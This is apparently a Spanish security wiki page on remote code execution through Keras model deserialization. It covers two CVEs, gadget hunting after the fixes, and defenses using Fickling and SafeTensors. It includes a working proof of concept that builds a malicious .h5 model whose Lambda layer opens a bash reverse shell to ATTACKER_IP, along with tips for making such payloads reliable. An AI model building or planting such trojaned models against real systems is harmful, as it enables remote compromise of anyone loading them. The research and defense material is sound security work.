# RCE por deserialización de modelos Keras y Gadget Hunting

{{#include ../banners/hacktricks-training.md}}

Esta página resume técnicas prácticas de explotación de la pipeline de deserialización de modelos de Keras, explica los detalles internos del formato nativo .keras y su superficie de ataque, y proporciona un toolkit para investigadores que buscan Model File Vulnerabilities (MFVs) y gadgets post-fix.

## Detalles internos del formato de modelo .keras

Un archivo .keras es un archivo ZIP que contiene al menos:<sup>[[1]](#references)</sup>
- metadata.json – información genérica (p. ej., la versión de Keras)
- config.json – arquitectura del modelo (superficie de ataque principal)
- model.weights.h5 – pesos en HDF5

config.json controla la deserialización recursiva: Keras importa módulos, resuelve clases/funciones y reconstruye capas/objetos a partir de diccionarios controlados por el atacante.<sup>[[1]](#references)</sup>

Ejemplo de fragmento para un objeto Dense:

```json
{
  "module": "keras.layers",
  "class_name": "Dense",
  "config": {
    "units": 64,
    "activation": {
      "module": "keras.activations",
      "class_name": "relu"
    },
    "kernel_initializer": {
      "module": "keras.initializers",
      "class_name": "GlorotUniform"
    }
  }
}
```

La deserialización realiza:<sup>[[1]](#references)</sup>
- Importación de módulos y resolución de símbolos a partir de las claves module/class_name
- Invocación de from_config(...) o del constructor con kwargs controlados por el atacante
- Recursión en objetos anidados (activaciones, inicializadores, restricciones, etc.)

Históricamente, esto exponía tres primitivas a un atacante que elaborara config.json:<sup>[[1]](#references)</sup>
- Control de qué módulos se importan
- Control de qué clases/funciones se resuelven
- Control de los kwargs que se pasan a los constructores/from_config

## CVE-2024-3660 – RCE mediante bytecode en la capa Lambda

Causa raíz:
- La deserialización heredada de Lambda reconstruía una función de Python a partir de código marshal controlado por el atacante: `func_load()` decodifica el payload en base64, llama a `marshal.loads()` y crea un `FunctionType`. El bytecode de la función resultante se ejecuta cuando se invoca Lambda, y los cargadores afectados anteriores a la versión 2.13 no aplicaban comprobaciones de modo seguro a los formatos heredados.<sup>[[3]](#references)[[16]](#references)[[17]](#references)[[18]](#references)</sup>

En un archivo nativo de Keras v3, la función Lambda se representa como un objeto `__lambda__` cuyo campo `code` contiene código marshal codificado en base64:<sup>[[17]](#references)[[18]](#references)</sup>

```json
{
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "exploit_lambda",
    "function": {
      "class_name": "__lambda__",
      "config": {
        "code": "<base64(marshal.dumps(function.__code__))>",
        "defaults": null,
        "closure": null
      }
    }
  }
}
```

Mitigación:
- Keras aplica `safe_mode=True` de forma predeterminada para el formato nativo de Keras v3. Las lambdas de Python serializadas en `Lambda` se bloquean, a menos que el usuario opte explícitamente por desactivar esta protección con `safe_mode=False`; esta protección no cubre los formatos heredados de la misma manera.<sup>[[1]](#references)[[16]](#references)[[17]](#references)</sup>

Notas:
- Los formatos heredados (guardados antiguos en HDF5) o las bases de código antiguas podrían no aplicar las comprobaciones modernas, por lo que los ataques de tipo «downgrade» aún pueden funcionar cuando las víctimas usan loaders antiguos.

## CVE-2025-1550 – Importación arbitraria de módulos en Keras 3.0.0–3.8.x

Causa raíz:
- `_retrieve_class_or_fn` usaba `importlib.import_module(module)` con cadenas de módulo controladas por el atacante provenientes de `config.json`.
- Impacto: Un archivo `.keras` manipulado podía hacer que `Model.load_model()` importara módulos y funciones de Python elegidos por el atacante, con efectos secundarios durante la importación y argumentos controlados por el atacante, incluso con `safe_mode=True`.<sup>[[1]](#references)[[4]](#references)</sup>

Idea de explotación:

```json
{
  "module": "maliciouspkg",
  "class_name": "Danger",
  "config": {"arg": "val"}
}
```

Mejoras de seguridad (Keras ≥ 3.9):<sup>[[1]](#references)[[2]](#references)</sup>
- Lista de módulos permitidos: las importaciones se restringen a módulos del ecosistema oficial: keras, keras_hub, keras_cv, keras_nlp
- Modo seguro predeterminado: safe_mode=True bloquea la carga insegura de funciones serializadas de Lambda
- Comprobación básica de tipos: los objetos deserializados deben coincidir con los tipos esperados

## Explotación práctica: RCE de Lambda en HDF5 de TensorFlow-Keras (.h5)

Es posible que las implementaciones heredadas de TensorFlow-Keras aún acepten archivos de modelos HDF5 (`.h5`). Si un atacante puede subir un modelo que el servidor cargue posteriormente o use para realizar inferencias, un cargador vulnerable puede deserializar una capa Lambda que contenga Python controlado por el atacante, el cual puede ejecutarse en el flujo de trabajo del modelo de la aplicación.<sup>[[3]](#references)[[7]](#references)[[16]](#references)</sup>

PoC mínimo para crear un .h5 malicioso cuya Lambda ejecuta un reverse shell cuando el objetivo invoca el modelo:

```python
import tensorflow as tf

def exploit(x):
    import os
    os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
    return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```

Notas y consejos de fiabilidad:
- Los puntos de activación varían según el formato y el flujo de trabajo; el write-up citado observó que el payload se ejecutó dos veces durante la predicción. Considera que los efectos secundarios pueden repetirse y haz que los payloads sean idempotentes.<sup>[[7]](#references)</sup>
- Fijación de versiones: usa las versiones de TF/Keras/Python de la víctima para evitar incompatibilidades de serialización. Por ejemplo, crea los artefactos con Python 3.8 y TensorFlow 2.13.1 si eso es lo que usa el objetivo.<sup>[[7]](#references)</sup>
- Réplica rápida del entorno:

```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```

- Validación: un payload benigno como os.system("ping -c 1 YOUR_IP") ayuda a confirmar la ejecución (p. ej., observar ICMP con tcpdump) antes de cambiar a una reverse shell.<sup>[[7]](#references)</sup>

## Superficie de gadgets dentro de la allowlist tras la corrección

Incluso con la allowlist de módulos de Keras y el safe mode, los callables permitidos pueden exponer efectos secundarios. Por ejemplo, `keras.utils.get_file` descarga una URL y la escribe en la ubicación de caché configurada, por lo que es un candidato para el análisis de gadgets.<sup>[[1]](#references)[[19]](#references)</sup>

Configuración candidata de Lambda (valida la firma de llamada en una prueba controlada):

```json
{
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "dl",
    "function": {
      "module": "keras.utils",
      "class_name": "get_file",
      "config": null,
      "registered_name": null
    },
    "arguments": {
      "origin": "https://example.com/artifact.bin",
      "cache_dir": "/tmp/keras-cache"
    }
  }
}
```

Importante limitación:
- `Lambda.call()` siempre pasa la entrada del modelo como primer argumento posicional y los `arguments` configurados como argumentos con nombre. Para `get_file`, ese valor posicional se asigna a `fname`; una incompatibilidad entre tensor y ruta puede hacer que este candidato falle antes de cualquier descarga, por lo que no es un gadget que funcione de forma garantizada.<sup>[[1]](#references)[[16]](#references)[[19]](#references)</sup>

## Allowlisting de importaciones de pickle de ML para modelos de AI/ML (Fickling)

Muchos formatos de modelos de AI/ML (archivos `.pt`/`.pth`/`.ckpt` de PyTorch, artefactos de joblib/scikit-learn y otros formatos nativos de Python) contienen datos pickle de Python. En cambio, la ruta heredada de Keras Lambda anterior usa bytecode de función serializado con marshal, por lo que constituye un riesgo de deserialización independiente. Los opcodes de pickle pueden invocar comportamientos controlados por un atacante durante la deserialización, incluida la manipulación de modelos o RCE, y los escáneres simples pueden pasar por alto importaciones peligrosas nuevas o no incluidas en la lista.<sup>[[7]](#references)[[8]](#references)[[14]](#references)[[18]](#references)</sup>

Una defensa práctica fail-closed consiste en interceptar el deserializador pickle de Python y permitir únicamente un conjunto revisado de importaciones inofensivas relacionadas con ML durante la deserialización. Fickling, de Trail of Bits, implementa esta política e incluye una allowlist seleccionada de importaciones de ML, creada a partir de miles de archivos pickle públicos de Hugging Face.<sup>[[8]](#references)[[13]](#references)</sup>

Modelo de seguridad para las importaciones «seguras» (intuiciones sintetizadas a partir de la investigación y la práctica): los símbolos importados que usa un archivo pickle deben cumplir simultáneamente lo siguiente:<sup>[[8]](#references)</sup>
- No ejecutar código ni provocar su ejecución (sin objetos de código compilados o fuente, ejecución de comandos shell, hooks, etc.)
- No obtener ni establecer atributos o elementos arbitrarios
- No importar ni obtener referencias a otros objetos de Python desde la VM de pickle
- No activar ningún deserializador secundario (p. ej., marshal, pickle anidados), ni siquiera indirectamente

Activa las protecciones de Fickling lo antes posible durante el inicio del proceso para que se comprueben todas las cargas de pickle realizadas por frameworks (`torch.load`, `joblib.load`, etc.):<sup>[[9]](#references)</sup>

```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```

Consejos operativos:
- Puedes deshabilitar y volver a habilitar temporalmente los hooks cuando sea necesario:<sup>[[9]](#references)</sup>

```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```

- Si se bloquea un modelo de confianza, amplía la lista de permitidos de tu entorno después de revisar los símbolos:<sup>[[9]](#references)</sup>

```python
fickling.hook.activate_safe_ml_environment(also_allow=[
    "package.subpackage.safe_symbol",
    "another.safe.import",
])
```

- Fickling también expone protecciones genéricas en tiempo de ejecución si prefieres un control más granular:<sup>[[9]](#references)</sup>
  - fickling.always_check_safety() para aplicar comprobaciones a todos los pickle.load()
  - with fickling.check_safety(): para aplicar comprobaciones de forma acotada
  - fickling.load(path) / fickling.is_likely_safe(path) para comprobaciones puntuales

- Siempre que sea posible, prefiere formatos de modelo que no sean pickle (p. ej., SafeTensors).<sup>[[15]](#references)</sup> Si debes aceptar pickle, ejecuta los cargadores con los privilegios mínimos, sin salida de red y aplica la allowlist.

Esta estrategia que prioriza la allowlist bloquea de forma demostrable las vías de explotación habituales de pickle en ML y, a la vez, mantiene una alta compatibilidad. En el benchmark de ToB, Fickling detectó el 100 % de los archivos maliciosos sintéticos y permitió aproximadamente el 99 % de los archivos limpios de los principales repositorios de Hugging Face.<sup>[[8]](#references)[[10]](#references)</sup>


## Herramientas para investigadores

1) Descubrimiento sistemático de gadgets en módulos permitidos

Enumera los callables candidatos en keras, keras_nlp, keras_cv, keras_hub y prioriza aquellos con efectos secundarios en archivos, red, procesos o entorno.<sup>[[1]](#references)</sup>

<details>
<summary>Enumerar callables potencialmente peligrosos en módulos Keras incluidos en la allowlist</summary>

```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
    if not hasattr(mod, "__path__"):
        return
    for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
        yield m.name

candidates = []
for root in ALLOWLIST:
    try:
        r = importlib.import_module(root)
    except Exception:
        continue
    for name in iter_modules(r):
        if name in seen:
            continue
        seen.add(name)
        try:
            m = importlib.import_module(name)
        except Exception:
            continue
        for n, obj in inspect.getmembers(m):
            if inspect.isfunction(obj) or inspect.isclass(obj):
                sig = None
                try:
                    sig = str(inspect.signature(obj))
                except Exception:
                    pass
                doc = (inspect.getdoc(obj) or "").lower()
                text = f"{name}.{n} {sig} :: {doc}"
                # Heuristics: look for I/O or network-ish hints
                if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
                    candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```

</details>

2) Pruebas de deserialización directa (no se necesita un archivo .keras)

Pasa diccionarios manipulados directamente a los deserializadores de Keras para descubrir qué parámetros aceptan y observar los efectos secundarios.<sup>[[1]](#references)</sup>

```python
import keras

cfg = {
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "probe",
    "function": {
      "module": "keras.utils",
      "class_name": "get_file",
      "config": null,
      "registered_name": null
    },
    "arguments": {
      "origin": "https://example.com/x",
      "cache_dir": "/tmp/keras-cache"
    }
  }
}

layer = keras.saving.deserialize_keras_object(cfg, safe_mode=True)  # Observe behavior
```

3) Sondeo entre versiones y formatos

Keras existe en múltiples bases de código/eras con diferentes protecciones y formatos:<sup>[[1]](#references)</sup>
- TensorFlow built-in Keras: tensorflow/python/keras (legacy, prevista para su eliminación)
- tf-keras: mantenido por separado
- Multi-backend Keras 3 (oficial): introdujo el formato nativo .keras

Repite las pruebas en distintas bases de código y formatos (.keras frente a HDF5 legacy) para descubrir regresiones o protecciones ausentes.

## References

- [1] [Búsqueda de vulnerabilidades en la deserialización de modelos Keras (blog de huntr)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [Keras PR #20751 – Se añadieron comprobaciones a la serialización](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 – RCE mediante deserialización de Lambda en Keras](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 – Importación arbitraria de módulos en Keras (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [Informe de huntr – importación arbitraria #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [Informe de huntr – importación arbitraria #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial – RCE de Lambda de TensorFlow .h5 a root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [Blog de Trail of Bits – El nuevo escáner de archivos pickle de IA/ML de Fickling](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling – Protección de entornos de IA/ML (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [Corpus de referencia para el análisis de pickle de Fickling](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Antecedentes de los ataques Sleepy Pickle](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [Proyecto SafeTensors](https://github.com/safetensors/safetensors)
- [16] [CERT/CC VU#253266 – Las capas Lambda de Keras 2 permiten la inyección de código arbitrario](https://kb.cert.org/vuls/id/253266)
- [17] [Código fuente de la capa Lambda de Keras (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/layers/core/lambda_layer.py)
- [18] [Código fuente de las utilidades de Python de Keras (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/utils/python_utils.py)
- [19] [API `get_file` de Keras](https://keras.io/api/utils/python_utils/#get_file-function)
{{#include ../banners/hacktricks-training.md}}
